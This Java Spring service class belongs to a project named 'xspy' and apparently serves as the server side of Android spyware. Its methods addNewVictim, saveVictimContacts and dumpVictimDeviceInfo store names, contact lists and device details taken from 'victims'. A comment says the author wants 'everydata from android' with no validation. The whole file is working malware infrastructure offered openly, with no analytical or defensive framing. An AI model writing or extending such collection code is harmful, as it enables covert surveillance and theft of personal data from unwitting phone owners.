package com.leadexperience.xspy.service;


import com.leadexperience.xspy.models.StatusCodeModel;
import com.leadexperience.xspy.models.tables.ContactTable;
import com.leadexperience.xspy.models.tables.DeviceInfo;
import com.leadexperience.xspy.models.tables.NameTable;
import com.leadexperience.xspy.respository.ContactRepo;
import com.leadexperience.xspy.respository.DeviceInfoRepo;
import com.leadexperience.xspy.respository.UserDataRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Component;
import org.springframework.stereotype.Service;

@Component
@Service
public class ApiService {
    private final static String NO_DATA = "Record not found!";
    private final static String RECORD_FOUND = "Record Found Successfully !";
    @Autowired
    private UserDataRepository userDataRepository;

    @Autowired
    private ContactRepo contactRepo;

    @Autowired
    private DeviceInfoRepo deviceInfoRepo;



    public ResponseEntity<?> addNewVictim(NameTable nameTable) {
        // Getting all the initial traffic No Validations WhatSo Ever.
        // I need everydata from android.
        userDataRepository.save(nameTable);
        userDataRepository.flush();
        return new ResponseEntity<>(new StatusCodeModel("success", 200, "Inserted Victims Name !"), HttpStatus.OK);
    }


    public ResponseEntity<?> saveVictimContacts(ContactTable contactTable) {
        contactRepo.save(contactTable);
        contactRepo.flush();
        return new ResponseEntity<>(new StatusCodeModel("success", 200, "Inserted Victim Contact into Db !"), HttpStatus.OK);

    }

    public ResponseEntity<?> dumpVictimDeviceInfo(DeviceInfo deviceInfo) {
        deviceInfoRepo.save(deviceInfo);

        deviceInfoRepo.flush();


        return ResponseEntity.ok(new StatusCodeModel("success",200,"Device Info Inserted SuccessFully"));


    }
}
